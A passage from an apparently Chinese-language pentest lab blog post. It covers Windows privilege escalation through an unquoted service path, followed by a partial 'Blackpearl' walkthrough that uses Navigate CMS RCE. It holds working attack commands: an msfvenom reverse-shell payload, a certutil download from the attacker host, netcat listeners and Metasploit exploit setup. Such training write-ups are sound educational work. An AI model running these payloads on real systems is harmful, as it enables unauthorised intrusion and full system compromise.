SeSystemProfilePrivilege: DISABLED</span><br><span class="line">    SeSystemtimePrivilege: DISABLED</span><br><span class="line">    SeProfileSingleProcessPrivilege: DISABLED</span><br><span class="line">    SeIncreaseBasePriorityPrivilege: DISABLED</span><br><span class="line">    SeCreatePagefilePrivilege: DISABLED</span><br><span class="line">    SeBackupPrivilege: DISABLED</span><br><span class="line">    SeRestorePrivilege: DISABLED</span><br><span class="line">    SeShutdownPrivilege: DISABLED</span><br><span class="line">    SeDebugPrivilege: SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeSystemEnvironmentPrivilege: DISABLED</span><br><span class="line">    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeRemoteShutdownPrivilege: DISABLED</span><br><span class="line">    SeUndockPrivilege: DISABLED</span><br><span class="line">    SeManageVolumePrivilege: DISABLED</span><br><span class="line">    **SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED**</span><br><span class="line">    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED</span><br><span class="line">    SeIncreaseWorkingSetPrivilege: DISABLED</span><br><span class="line">    SeTimeZonePrivilege: DISABLED</span><br><span class="line">    SeCreateSymbolicLinkPrivilege: DISABLED</span><br><span class="line">    SeDelegateSessionUserImpersonatePrivilege: DISABLED</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">����������͹ Interesting Processes -non Microsoft-</span><br><span class="line">� Check <span class="keyword">if</span> any interesting processes <span class="keyword">for</span> memory dump or <span class="keyword">if</span> you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                                         </span><br><span class="line">    svchost(264)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">    svchost(2592)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE</span><br><span class="line">    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])</span><br><span class="line">    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p</span><br><span class="line">   =================================================================================================</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    jenkins(2388)[C:\Program Files\Jenkins\jenkins.exe] -- POwn: butler -- isDotNet</span><br><span class="line">    **Permissions: butler [AllAccess], Administrators [AllAccess]**</span><br><span class="line">    Possible DLL Hijacking folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])</span><br><span class="line">    Command Line: <span class="string">&quot;C:\Program Files\Jenkins\**jenkins.exe**&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">#在Download目錄下有這檔案</span></span><br><span class="line"><span class="comment">#**WiseCare365_5.6.7.568.exe</span></span><br><span class="line"><span class="comment">#當我們有能力濫用某項服務時，我們將無權停止和啟動該服務。但是，如果服務自動啟動，我們可以利用關機權限來重新啟動機器；以及最終的服務。**</span></span><br><span class="line">**WiseBootAssistant**(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\**Wise Care 365**\BootTime.exe] - Auto - Running **- No quotes and Space detected**</span><br><span class="line">    YOU CAN MODIFY THIS SERVICE: AllAccess</span><br><span class="line">    File Permissions: Administrators [AllAccess]</span><br><span class="line">    Possible DLL Hijacking <span class="keyword">in</span> binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])</span><br><span class="line">    In order to optimize system performance,Wise Care 365 will calculate your system startup <span class="keyword">time</span>.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/unquoted-service-paths/">https://juggernaut-sec.com/unquoted-service-paths/</a></p>
<ul>
<li><p><strong>No quotes and Space detected 告訴我們的那些事:</strong></p>
<p>  當涉及 <strong>Windows 權限升級技術</strong>時，常見的升級路徑是利用<strong>錯誤配置的服務</strong>。服務配置錯誤的方式有很多種；最有趣的情況是<strong>未加引號的服務路徑</strong>(unquoted service paths)</p>
<p>  當服務指向的路徑中的<strong>可執行檔沒有空格或有空格但用引號引起來</strong>時，該服務將直接沿著該路徑到達可執行檔並按預期啟動。例如：C:\temp\service.exe 和「C:\tempfolder\service.exe」配置正確，將執行service.exe。</p>
<p>  假設您有一個從下列檔案位置執行的服務：<strong>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</strong></p>
<p>  由於<strong>服務可執行檔案的檔案路徑中有空格且沒有引號</strong>，因此服務將<strong>嘗試透過將空格之前的資料夾</strong>名稱的每個部分視為<strong>駐留在上一個資料夾中的可執行檔</strong>來啟動，如下所示：</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files\Juggernaut.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production.exe</li>
<li>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</li>
</ul>
<p>  如果我們有權在實際可執行位置之前的三個資料夾中的任何一個中寫入，那麼我們可以製作一個可執行檔並<strong>根據路徑中的資料夾</strong>名稱對其進行命名，如上面的範例所示。之後，當<strong>服務啟動</strong>時，它將執行.exe惡意程序，而不是預期的程序。</p>
<p>  如果我們可以寫入C:. 我們將製作一個名為 Program.exe 的可執行檔並將其放置在 C:\ 中。如果我們可以寫入 C:\Program Files，我們將製作一個名為 Juggernaut.exe 的可執行檔並將其放置在 C:\Program Files 中。等等…</p>
</li>
</ul>
<p>檢測到該服務不含引號 C:\Program Files (x86)\Wise**Wise Care 365**\BootTime.exe</p>
<p><img src="/img/privilege_Untitled_39.png" alt="Untitled"></p>
<p>也就是說可以利用這個特性</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files (x86)\Wise\Wise.exe</li>
</ul>
<p>所以可以製作一個惡意程式叫Wise.exe，對win10做提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.19.130 LPORT=7777 -f exe&gt; Wise.exe**</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                                                 </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\&gt;<span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span>                          </span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;Program Files (x86)&quot;</span></span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)</span><br><span class="line"></span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:34 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:05 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">02/17/2024  01:37 PM    &lt;DIR&gt;          Microsoft</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          Microsoft.NET</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">12/07/2019  01:49 AM    &lt;DIR&gt;          Windows NT</span><br><span class="line">04/09/2021  05:55 AM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">12/07/2019  01:52 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">12/07/2019  01:31 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          Wise</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              15 Dir(s)  11,391,279,104 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)&gt;**<span class="built_in">cd</span> Wise**</span><br><span class="line"><span class="built_in">cd</span> Wise</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Program Files (x86)\Wise</span><br><span class="line"></span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  05:28 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/17/2024  12:38 AM    &lt;DIR&gt;          Wise Care 365</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  11,396,620,288 bytes free</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe**</span><br><span class="line">certutil -urlcache -f http://192.168.19.130/Wise.exe Wise.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>

<p>如果直接執行 <code>./Wise.exe</code> 運行的是普通用戶</p>
<p>先重啟WiseBootAssistant服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Program Files (x86)\Wise&gt;sc stop WiseBootAssistant</span><br><span class="line">sc stop WiseBootAssistant</span><br><span class="line">[SC] ControlService FAILED 1062:</span><br><span class="line"></span><br><span class="line">The service has not been started.</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;sc query WiseBootAssistant</span><br><span class="line">sc query WiseBootAssistant</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: WiseBootAssistant </span><br><span class="line">        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)</span><br><span class="line">        STATE              : 1  STOPPED </span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line"></span><br><span class="line">c:\Program Files (x86)\Wise&gt;**sc start WiseBootAssistant**</span><br><span class="line">sc start WiseBootAssistant</span><br></pre></td></tr></table></figure>

<p>在啟動服務的當下就成功執行Wise.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -nlvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49713</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Blackpearl"><a href="#Walkthrough-Blackpearl" class="headerlink" title="Walkthrough - Blackpearl"></a><strong>Walkthrough - Blackpearl</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.144</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 04:21 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.144</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)</span><br><span class="line">|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)</span><br><span class="line">|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)</span><br><span class="line">**53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)**</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian</span><br><span class="line">**80/tcp open  http    nginx 1.14.2**</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">MAC Address: 00:0C:29:5B:A7:0C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.94 ms 192.168.19.144</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 25.08 seconds</span><br></pre></td></tr></table></figure>

<p>80port開啟了nginx網頁，網頁源碼中能看到藏了訊息</p>
<ul>
<li><!-- Webmaster: alek@blackpearl.tcm -→</li>
</ul>
<p><img src="/img/privilege_Untitled_40.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_41.png" alt="Untitled"></p>
<p>接下來對網頁掃描存在的目錄</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.144/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.144/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 3ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 10ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 11ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 12ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 13ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 205ms]</span></span><br><span class="line"><span class="string">**secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:35] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>網頁下沒有其他目錄，但找到了一個<strong>secret文件</strong></p>
<p><img src="/img/privilege_Untitled_42.png" alt="Untitled"></p>
<p>看到53port有開啟，常試DNS爆破域名</p>
<ul>
<li><p>dnsrecon工具</p>
<ul>
<li>Scan a domain and save the results to a SQLite database:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --db &#123;&#123;path/to/database.sqlite&#125;&#125;</code></p>
<ul>
<li>Scan a domain, specifying the nameserver and performing a zone transfer:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --name_server &#123;&#123;nameserver.example.com&#125;&#125; --type axfr</code></p>
<ul>
<li>Scan a domain, using a dictionary of subdomains and hostnames for bruteforcing:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125; --type brt</code></p>
<ul>
<li>Scan a domain, performing a reverse lookup of IP ranges from the SPF record and saving the results to a JSON file:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -s --json</code></p>
<ul>
<li>Scan a domain, performing a Google enumeration and saving the results to a CSV file:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -g --csv</code></p>
<ul>
<li>Scan a domain, performing DNS cache snooping:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type snoop --name_server &#123;&#123;nameserver.example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125;</code></p>
<ul>
<li>Scan a domain, performing zone walking:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type zonewalk</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# **dnsrecon -r 127.0.0.0/24 -n 192.168.19.144**       </span><br><span class="line">[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255</span><br><span class="line">[+]      **PTR blackpearl.tcm 127.0.0.1**</span><br><span class="line">[+] 1 Records Found</span><br></pre></td></tr></table></figure>

<p>把這網域新增到&#x2F;etc&#x2F;hosts，這樣才能訪問到那網頁位置，並開啟那網頁嘗試訪問</p>
<p><img src="/img/privilege_Untitled_43.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_44.png" alt="Untitled"></p>
<p>接下來看看網頁下是否有潛藏的目錄內容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://blackpearl.tcm/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 9ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 11ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 14ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 19ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 21ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 25ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 28ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 31ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 34ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 37ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 41ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 45ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 47ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 68ms]</span></span><br><span class="line"><span class="string">**navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 10ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 7407 req/sec :: Duration: [0:00:29] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>查看到navigate目錄下是登入頁面</p>
<ul>
<li>Navigate CMS v2.8, © 2024</li>
</ul>
<p><img src="/img/privilege_Untitled_45.png" alt="Untitled"></p>
<ul>
<li>查看該版本可能的利用點</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA0QAQ&url=https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/&usg=AOvVaw0YC3U48-x5GBaLUam_sYrP&opi=89978449">Navigate CMS Unauthenticated Remote Code Execution</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECBEQAQ&url=https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-&usg=AOvVaw2kvp91G1FyoMXbtaidHmEF&opi=89978449">GitHub - 0x4r2&#x2F;Navigate-CMS-RCE-Unauthenticated-: This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA8QAQ&url=https://www.exploit-db.com/exploits/45561&usg=AOvVaw0ZgfU3dceG_UvE4GwEcOXX&opi=89978449">Navigate CMS - (Unauthenticated) Remote Code Execution (Metasploit)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt;  **use exploit/multi/http/navigate_cms_rce**</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   **RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas**</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   **LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)**</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   **0   Automatic**</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> target 0**</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span 